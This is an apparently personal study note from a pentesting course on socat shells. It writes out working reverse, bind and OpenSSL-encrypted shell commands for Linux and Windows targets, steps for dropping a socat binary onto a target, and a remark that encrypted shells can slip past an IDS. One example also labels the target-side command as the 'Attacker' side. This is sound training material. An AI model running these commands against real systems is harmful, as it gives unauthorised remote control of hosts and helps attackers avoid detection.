---
{"dg-publish":true,"permalink":"/socat/","hide":"true"}
---

- Netcat on steroids.
- Socat shells are **usually more stable** than netcat shells.
- Both have `.exe` versions.
- two big catches:
	1. The syntax is more difficult
	2. Socat is very rarely installed by default.
- Limited to **Linux target**
- On Windows will be no more stable than a netcat shell.
1. On the attacker download the file
```sh
   wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
   ```
   and set a python server
   ```sh
   sudo python3 -m http.server 80
   ```
2. On the target, get the file
	```sh
	wget <LOCAL-IP>/socat -O /tmp/socat
	```
	On windows
	```sh
	Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
	```
## Reverse shell
### On the attacker
basic reverse shell listener
```sh
socat TCP-L:<port> -
```
### On the target
#### Windows
On **Windows** we would use this command to connect back:
```sh
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```
The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.
#### Linux
This is the equivalent command for a **Linux** Target:
```sh
socat TCP:<attacker-IP>:<attacker-PORT> EXEC:"bash -li"
```
### Fully stable Linux tty reverse shell
#### On the attacker 
This will only **work when the target is Linux**, but is _significantly_ more stable.
Perhaps one of its most useful applications.
```sh
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```
- The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command.
- This means that the target must have socat installed.
- Most machines do not have socat installed by default, however, it's possible to upload a [precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true), which can then be executed as normal.
#### On the target
```sh
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
- The first part  we're linking up with the listener running on our own machine.
- The second part creates an interactive bash session with  `EXEC:"bash -li"`.
- We're also passing the arguments: pty, stderr, sigint, setsid and sane:
	- **pty**, allocates a pseudoterminal on the target -- part of the stabilisation process
	- **stderr**, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
	- **sigint**, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
	- **setsid**, creates the process in a new session
	- **sane**, stabilises the terminal, attempting to "normalise" it.
- As normal, on the **left** we have a **listener** running on our local **attacking machine**, on the **right** we have a simulation of a compromised **target**, running with a **non-interactive shell**. **Using the non-interactive** netcat **shell**, we **execute** the special **socat** command, and **receive a** fully **interactive** bash shell on the socat listener to the left:
![](https://i.imgur.com/etAuYzz.png)
- Note that the **socat shell is fully interactive**, allowing us to use interactive commands such as **SSH**.
- This can then be further **improved by setting the stty values** as seen in the previous task, which will let us **use** text editors such as **Vim or Nano**.
- **If**, at any point, a socat shell **is not working correctly**, it's well worth increasing the verbosity by **adding** `-d -d` into the command. This is very useful for experimental purposes, but is not usually necessary for general use.
## Bind shell
### On the target
#### Linux
On a Linux target we would use the following command:
```sh
socat TCP-L:<PORT> EXEC:"bash -li"
```
#### Windows
On a Windows target we would use this command for our listener:
```sh
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```
We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.  
### On the attacker
Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.
```sh
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```
## Encrypted Shells
- **Cannot be spied** on unless you have the decryption key
- Are often able to **bypass an [[Networking/Seguridad en redes/Seguridad Perimetral/IDS\|IDS]]** as a result.
- TCP should be replaced with `OPENSSL` when working with encrypted shells
- Generate a certificate
```sh
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
THis creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year.
will ask you to fill in information about the certificate, This can be left blank, or filled randomly.
- merge the two created files into a single `.pem` file:
```sh
cat shell.key shell.crt > shell.pem
```
### Reverse shell
- when we set up our reverse shell listener, we use:
```sh
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```
- This sets up an OPENSSL listener using our generated certificate
- `verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority.
- Please note that the certificate _must_ be used on whichever device is listening.
To connect back, we would use:
```sh
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

- The following image shows an OPENSSL Reverse shell from a Linux target. As usual, the target is on the right, and the attacker is on the left:

![](https://i.imgur.com/UbOPN9q.png)  
This technique will also **work** with the special, **Linux-only TTY shell** covered in the previous task -- figuring out the syntax for this will be the challenge for this task.
Feel free to use the Linux Practice box (deployable at the end of the room) to experiment if you're struggling to obtain the answer.
#### Example reverse shell full tty and encripted
Listenet
```sh
socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
```
Attacker:
```sh
socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
### Bind shell
Target:
```sh
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```
Attacker:
```sh
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```
Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.
